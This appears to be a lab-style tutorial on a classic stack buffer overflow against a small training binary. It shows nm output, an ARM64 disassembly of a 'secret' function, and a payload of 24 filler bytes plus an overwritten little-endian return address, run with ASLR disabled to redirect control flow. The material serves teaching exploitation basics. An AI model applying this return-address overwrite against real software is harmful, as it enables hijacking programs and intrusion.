### Open the project in your IDE and check function addresses

```
╰─ nm 1
0000000100000000 T __mh_execute_header
000000010000051c T _main
                 U _printf
                 U _scanf
00000001000004b0 T _secret
00000001000004cc T _vuln
```
This shows secret at 0x1000004b0 and vuln at 0x1000004cc.<br>

### Frame layout and what to overwrite
In the code you have a char buf[16]. A typical stack frame layout may look like:

```
[ local buffer (16 bytes) ]
[ padding / saved registers (8 bytes) ]
[ saved return address (8 bytes) ]
```

```
; Segment type: Pure code
AREA __text, CODE
; ORG 0x1000004B0
CODE64


; Attributes: bp-based frame

EXPORT _secret
_secret

var_s0=  0
var_s8=  8

; __unwind {
STP             X29, X30, [SP,#-0x10+var_s0]!
MOV             X29, SP                                      // __text:00000001000004B4
ADRL            X0, aWowUrAreStrong ; "Wow ur are strong!\n"
BL              _printf
LDP             X29, X30, [SP+var_s0],#0x10
RET
; } // starts at 1000004B0
; End of function _secret
```
we use `MOV  X29, SP ` addr, so as not to crash the stack.

To redirect execution into secret, input enough bytes to overflow the buffer and overwrite the saved return address with the address of secret.<br>
`Important: the target architecture is little-endian — so the 8-byte address 0x00000001000004B4 must be written bytewise in reverse order: \xb4\x04\x00\x00\x01\x00\x00\x00.`
# Example payload 
```
>>> b"A"*24 + b'\xb4\x04\x00\x00\x01\x00\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAA\xb4\x04\x00\x00\x01\x00\x00\x00'
```
Here 24 is roughly 16 bytes for the buffer + 8 bytes padding; followed by the 8-byte return address.
## Run without address randomization (PIE/ASLR)

Run the program in an environment where ASLR/PIE is disabled so addresses are stable:
```
aslrbp -ne "AAAAAAAAAAAAAAAAAAAAAAAA\xb4\x04\x00\x00\x01\x00\x00\x00" ./1
```
# Result
The program prints:
```
Wow ur are strong!
```
even though secret() is not called explicitly in the source — control flow was redirected by the stack overflow.
